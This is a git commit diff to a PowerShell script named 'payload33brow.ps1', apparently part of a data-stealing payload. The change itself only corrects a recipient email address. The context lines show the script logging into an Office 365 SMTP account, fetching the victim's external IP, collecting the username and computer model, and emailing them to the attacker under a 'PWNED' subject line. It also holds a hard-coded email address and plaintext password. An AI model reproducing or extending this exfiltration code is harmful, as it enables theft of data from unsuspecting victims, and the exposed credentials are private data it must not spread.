0b58555b7a340e59b823ce4d59996b5589a15704
David M <109196954+david26099@users.noreply.github.com>
2023-02-25 17:31:03 -0300

    Update payload33brow.ps1

--- payload33brow.ps1
+++ payload33brow.ps1
@@ -20,7 +20,7 @@ $smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
 $smtp.Credentials = New-Object System.Net.NetworkCredential("davimoura2609@hotmail.com", "davi2009moura");
 $smtp.EnableSsl = $true
 $Message.From = "davimoura2609@hotmail.com"
-$Message.To.Add("davimouara2609@gmail.com")
+$Message.To.Add("davimoura2609@gmail.com")
 $ip = Invoke-RestMethod "myexternalip.com/raw"
 $Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
 $ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
